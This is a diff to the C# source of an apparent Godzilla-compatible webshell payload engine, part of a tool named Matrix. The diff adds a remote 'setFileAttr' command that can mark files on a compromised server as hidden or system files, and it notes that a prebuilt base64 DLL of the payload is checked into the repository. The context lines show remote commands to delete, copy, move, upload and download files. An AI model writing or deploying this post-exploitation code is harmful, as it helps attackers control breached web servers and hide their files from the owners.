@@ -14,11 +14,9 @@
 // Build (Windows / any host with .NET Framework csc):
 //   csc /target:library /out:matrix_godzilla.dll MatrixGodzillaEngine.cs
 //
-// NOTE: this file is provided as source only. The Matrix build does not ship a
-// prebuilt DLL (no .NET toolchain in CI); run tool/godzilla_engine/build.sh on
-// a machine with csc/mono to produce data/godzilla/matrix_godzilla.dll.b64.
-// Without that asset the ASPX connector still works against a session that a
-// regular Godzilla client has already seeded.
+// NOTE: data/godzilla/matrix_godzilla.dll.b64 is built from this source with
+// csc (Windows) or mcs (Mono) and checked in. Regenerate it with
+// tool/godzilla_engine/build.sh on a host that has a .NET compiler.
 
 using System;
 using System.Collections;
@@ -179,6 +177,7 @@ public class LY
                 case "deleteFile": return Bytes(Delete(Str(parameters, "fileName")));
                 case "copyFile": return Bytes(Copy(Str(parameters, "srcFileName"), Str(parameters, "destFileName")));
                 case "moveFile": return Bytes(Move(Str(parameters, "srcFileName"), Str(parameters, "destFileName")));
+                case "setFileAttr": return Bytes(SetFileAttr(Str(parameters, "type"), Str(parameters, "fileName"), Str(parameters, "attr")));
                 case "bigFileDownload": return BigDownload();
                 case "bigFileUpload": return Bytes(BigUpload());
                 case "test": return Bytes("ok");
@@ -300,6 +299,24 @@ public class LY
         File.Copy(src, dst, true);
         File.Delete(src);
         return "ok";
+    }
+
+    private string SetFileAttr(string type, string path, string attr)
+    {
+        if (string.IsNullOrEmpty(path)) return "fail";
+        try
+        {
+            FileAttributes fa = (FileAttributes)0;
+            string a = (attr ?? "").ToUpperInvariant();
+            if (a.Contains("R")) fa |= FileAttributes.ReadOnly;
+            if (a.Contains("H")) fa |= FileAttributes.Hidden;
+            if (a.Contains("S")) fa |= FileAttributes.System;
+            if (a.Contains("A")) fa |= FileAttributes.Archive;
+            if (fa == (FileAttributes)0) fa = FileAttributes.Normal;
+            File.SetAttributes(path, fa);
+            return "ok";
+        }
+        catch { return "fail"; }
     }
 
     private byte[] BigDownload()
